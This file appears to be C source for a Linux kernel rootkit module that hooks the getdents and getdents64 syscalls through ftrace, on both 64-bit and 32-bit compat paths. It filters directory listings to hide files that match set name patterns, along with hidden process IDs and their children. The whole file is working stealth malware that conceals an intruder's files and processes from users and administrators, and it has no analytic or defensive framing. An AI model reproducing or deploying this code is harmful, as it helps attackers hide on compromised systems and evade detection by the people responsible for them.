#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include "../include/hiding_stat.h"
#include "../include/hiding_directory_def.h"

#ifndef HAVE_LINUX_DIRENT
struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[];
};
#endif

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64_ia32)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
static asmlinkage long (*orig_getdents_ia32)(const struct pt_regs *);

static notrace bool should_hide_name(const char *name)
{
    int i, pid;

    if (!name)
        return false;

    for (i = 0; hidden_patterns[i] != NULL; i++) {
        if (strstr(name, hidden_patterns[i]))
            return true;
    }

    if (kstrtoint(name, 10, &pid) < 0)
        return false;

    if (is_hidden_pid(pid) || is_child_pid(pid))
        return true;

    return false;
}

static notrace long filter_dirents(void __user *user_dir, long n, bool is_64)
{
    char *kernel_buf, *filtered_buf;
    long offset = 0, new_offset = 0, result = n;

    if (n <= 0)
        return n;

    kernel_buf = kmalloc(n, GFP_KERNEL);
    if (!kernel_buf)
        return -ENOMEM;

    if (copy_from_user(kernel_buf, user_dir, n)) {
        kfree(kernel_buf);
        return -EFAULT;
    }

    filtered_buf = kzalloc(n, GFP_KERNEL);
    if (!filtered_buf) {
        kfree(kernel_buf);
        return -ENOMEM;
    }

    while (offset < result) {
        char *curr_name;
        unsigned short reclen;
        void *curr_entry = kernel_buf + offset;

        if (is_64) {
            struct linux_dirent64 *d = (struct linux_dirent64 *)curr_entry;
            curr_name = d->d_name;
            reclen = d->d_reclen;
        } else {
            struct linux_dirent *d = (struct linux_dirent *)curr_entry;
            curr_name = d->d_name;
            reclen = d->d_reclen;
        }

        if (!should_hide_name(curr_name)) {
            if (new_offset + reclen <= n) {
                memcpy(filtered_buf + new_offset, curr_entry, reclen);
                new_offset += reclen;
            }
        }

        offset += reclen;
    }

    if (clear_user(user_dir, result)) {
        kfree(kernel_buf);
        kfree(filtered_buf);
        return -EFAULT;
    }

    if (new_offset > 0 && copy_to_user(user_dir, filtered_buf, new_offset)) {
        kfree(kernel_buf);
        kfree(filtered_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    kfree(filtered_buf);
    return new_offset;
}

static notrace asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    long res = orig_getdents64(regs);
    if (res <= 0) return res;
    return filter_dirents((void __user *)regs->si, res, true);
}

static notrace asmlinkage long hook_getdents(const struct pt_regs *regs)
{
    long res = orig_getdents(regs);
    if (res <= 0) return res;
    return filter_dirents((void __user *)regs->si, res, false);
}

static notrace asmlinkage long hook_getdents64_compat(const struct pt_regs *regs)
{
    long res = orig_getdents64_ia32(regs);
    if (res <= 0) return res;
    return filter_dirents((void __user *)regs->bx, res, true);
}

static notrace asmlinkage long hook_getdents_compat(const struct pt_regs *regs)
{
    long res = orig_getdents_ia32(regs);
    if (res <= 0) return res;
    return filter_dirents((void __user *)regs->bx, res, false);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents",   hook_getdents,   &orig_getdents),
    HOOK("__ia32_sys_getdents64", hook_getdents64_compat, &orig_getdents64_ia32),
    HOOK("__ia32_sys_getdents",   hook_getdents_compat,   &orig_getdents_ia32),
    HOOK("__ia32_compat_sys_getdents", hook_getdents_compat, &orig_getdents_ia32),
};

int __init hiding_directory_init(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

void __exit hiding_directory_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
